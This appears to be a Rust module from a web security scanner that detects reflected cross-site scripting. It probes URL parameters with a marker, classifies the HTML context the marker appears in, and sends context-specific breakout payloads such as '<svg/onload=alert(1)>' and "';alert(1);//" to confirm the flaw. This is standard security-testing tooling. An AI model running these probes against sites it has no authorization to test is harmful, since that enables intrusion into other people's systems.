//! # Phase 6: Reflected XSS Detection
//!
//! Analyzes HTML context to generate context-aware XSS payloads.
//! Detects reflection points and crafts escapes for each context.
//!
//! ## Context Detection
//! - **HtmlTag**: `<div>[REFLECTED]</div>` → `<svg/onload=alert(1)>`
//! - **DoubleQuoteAttr**: `<input value="[REFLECTED]">` → `\"><svg...`
//! - **SingleQuoteAttr**: `<input value='[REFLECTED]'>` → `'><svg...`
//! - **ScriptBlock**: `<script>var x = '[REFLECTED]';</script>` → `';alert(1);//`
//!
//! ## Payloads
//! - Event handlers: onload, onerror, onmouseover
//! - Data URIs: javascript: protocol
//! - SVG vectors: `<svg>` with event attributes

use crate::{
    context::ScanContext,
    contracts::{ScanFinding, ScanPhase},
    error::ScannerError,
};
use async_trait::async_trait;
use reqwest::StatusCode;
use url::Url;

/// XSS scanner with HTML context-aware payload generation
#[derive(Debug, Clone, PartialEq)]
enum HtmlContext {
    HtmlTag,         // <div>[REFLECTED]</div>
    DoubleQuoteAttr, // <input value="[REFLECTED]">
    SingleQuoteAttr, // <input value='[REFLECTED]'>
    ScriptBlock,     // <script>var x = '[REFLECTED]';</script>
    Unknown,
}

pub struct XssScanner;

impl XssScanner {
    /// Analyze HTML context where reflection occurs
    fn analyze_context(body: &str, marker: &str) -> HtmlContext {
        let offset = match body.find(marker) {
            Some(idx) => idx,
            None => return HtmlContext::Unknown,
        };

        let pre_match = &body[..offset];

        // Check if inside <script> block
        let script_open_count = pre_match.matches("<script").count();
        let script_close_count = pre_match.matches("</script>").count();
        if script_open_count > script_close_count {
            return HtmlContext::ScriptBlock;
        }

        // Find last HTML tag opening
        let last_tag_open = pre_match.rfind('<');
        let last_tag_close = pre_match.rfind('>');

        if let Some(open_idx) = last_tag_open {
            if last_tag_close.is_none() || last_tag_close.unwrap() < open_idx {
                // Inside a tag (attribute context)
                let tag_content = &pre_match[open_idx..];
                let double_quotes = tag_content.matches('"').count();
                let single_quotes = tag_content.matches('\'').count();

                if !double_quotes.is_multiple_of(2) {
                    return HtmlContext::DoubleQuoteAttr;
                } else if !single_quotes.is_multiple_of(2) {
                    return HtmlContext::SingleQuoteAttr;
                }
            }
        }

        HtmlContext::HtmlTag
    }

    /// Generate context-specific XSS payload
    fn generate_payload(context: HtmlContext) -> &'static str {
        match context {
            HtmlContext::HtmlTag => "<svg/onload=alert(1)>",
            HtmlContext::DoubleQuoteAttr => "\"><svg/onload=alert(1)>",
            HtmlContext::SingleQuoteAttr => "'><svg/onload=alert(1)>",
            HtmlContext::ScriptBlock => "';alert(1);//",
            HtmlContext::Unknown => "<script>alert(1)</script>",
        }
    }
}

#[async_trait]
impl ScanPhase for XssScanner {
    fn phase_number(&self) -> u8 {
        6
    }

    fn name(&self) -> &'static str {
        "Context-Aware XSS Expert"
    }

    async fn execute(&self, ctx: &ScanContext) -> Result<Vec<ScanFinding>, ScannerError> {
        ctx.log("Phase 6: Context-aware XSS scanning initiated...".to_string());
        let mut findings = Vec::new();

        let marker = "vnmxss_marker_7f9e2c";

        for entry in ctx.discovered_endpoints.iter() {
            let url_str = entry.key().clone();
            let params = entry.value().clone();

            for param in params {
                if let Ok(mut test_url) = Url::parse(&url_str) {
                    test_url.query_pairs_mut().append_pair(&param, marker);

                    if let Ok(Ok(response)) = tokio::time::timeout(
                        std::time::Duration::from_secs(5),
                        ctx.client.get(test_url.as_str()).send(),
                    )
                    .await
                    {
                        if response.status() == StatusCode::OK {
                            if let Ok(body) = response.text().await {
                                if body.contains(marker) {
                                    // Reflection detected - analyze context
                                    let html_context = Self::analyze_context(&body, marker);
                                    ctx.log(format!(
                                        "Reflected XSS found on {} param={} context={:?}",
                                        url_str, param, html_context
                                    ));

                                    // Generate context-specific payload
                                    let payload = Self::generate_payload(html_context.clone());

                                    // Verify payload execution
                                    if let Ok(mut exploit_url) = Url::parse(&url_str) {
                                        exploit_url.query_pairs_mut().append_pair(&param, payload);

                                        if let Ok(Ok(verify_res)) = tokio::time::timeout(
                                            std::time::Duration::from_secs(5),
                                            ctx.client.get(exploit_url.as_str()).send(),
                                        )
                                        .await
                                        {
                                            if let Ok(verify_body) = verify_res.text().await {
                                                if verify_body.contains(payload) {
                                                    findings.push(ScanFinding {
                                                        phase: self.phase_number(),
                                                        module_name: self.name().to_string(),
                                                        severity: "HIGH".to_string(),
                                                        description: format!(
                                                            "Confirmed Reflected XSS on parameter '{}' (Context: {:?})",
                                                            param, html_context
                                                        ),
                                                        evidence: format!(
                                                            "Payload: {} | Exploit URL: {}",
                                                            payload, exploit_url
                                                        ),
                                                    });
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        ctx.log(format!(
            "Phase 6: XSS scanning completed. Found {} vulnerabilities.",
            findings.len()
        ));

        Ok(findings)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_phase_number() {
        let scanner = XssScanner;
        assert_eq!(scanner.phase_number(), 6);
    }

    #[test]
    fn test_phase_name() {
        let scanner = XssScanner;
        assert_eq!(scanner.name(), "Context-Aware XSS Expert");
    }

    #[test]
    fn test_html_tag_context() {
        let html = "<div>vnmxss_marker_7f9e2c</div>";
        let context = XssScanner::analyze_context(html, "vnmxss_marker_7f9e2c");
        assert_eq!(context, HtmlContext::HtmlTag);
    }

    #[test]
    fn test_double_quote_attr_context() {
        let html = r#"<input value="vnmxss_marker_7f9e2c">"#;
        let context = XssScanner::analyze_context(html, "vnmxss_marker_7f9e2c");
        assert_eq!(context, HtmlContext::DoubleQuoteAttr);
    }

    #[test]
    fn test_single_quote_attr_context() {
        let html = "<input value='vnmxss_marker_7f9e2c'>";
        let context = XssScanner::analyze_context(html, "vnmxss_marker_7f9e2c");
        assert_eq!(context, HtmlContext::SingleQuoteAttr);
    }

    #[test]
    fn test_script_block_context() {
        let html = "<script>var x = 'vnmxss_marker_7f9e2c';</script>";
        let context = XssScanner::analyze_context(html, "vnmxss_marker_7f9e2c");
        assert_eq!(context, HtmlContext::ScriptBlock);
    }

    #[test]
    fn test_payload_generation() {
        assert_eq!(
            XssScanner::generate_payload(HtmlContext::HtmlTag),
            "<svg/onload=alert(1)>"
        );
        assert_eq!(
            XssScanner::generate_payload(HtmlContext::DoubleQuoteAttr),
            "\"><svg/onload=alert(1)>"
        );
        assert_eq!(
            XssScanner::generate_payload(HtmlContext::SingleQuoteAttr),
            "'><svg/onload=alert(1)>"
        );
        assert_eq!(
            XssScanner::generate_payload(HtmlContext::ScriptBlock),
            "';alert(1);//"
        );
    }
}
